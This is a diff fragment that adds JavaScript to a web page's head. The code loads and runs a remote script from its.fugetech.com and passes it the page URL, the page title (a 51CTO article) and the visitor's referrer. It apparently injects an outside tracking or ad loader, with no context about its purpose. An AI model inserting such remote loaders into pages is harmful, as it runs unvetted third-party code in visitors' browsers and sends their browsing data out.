@@ -1,0 +1,4 @@
+
+  var s0 = document.createElement("script");
+  s0.src = "http://its.fugetech.com/m.js?p=3752&k=B699A0CCE5009DE9&g=7c2cf2df7bcd4191b1d9162112c80eea&lp=http%3A%2F%2Fmobile.51cto.com%2Fweb-434181.htm&ti=%E7%A7%BB%E5%8A%A8Web%E5%BC%80%E5%8F%91%E5%BF%85%E5%A4%87%E7%9A%849%E6%AC%BEJavaScript%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6+-+51CTO.COM&rf=http%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DU-Qw_vsROTAZeggiuXwgDXcCkvBmSM6yGnXBA39bOrdiOfP-eYuujyANz9hMrTmd%26wd%3D%26eqid%3Defa24bee0026a9fc00000003572e6e8d&referrer=" + encodeURIComponent(document.referrer);
+  document.head.appendChild(s0)
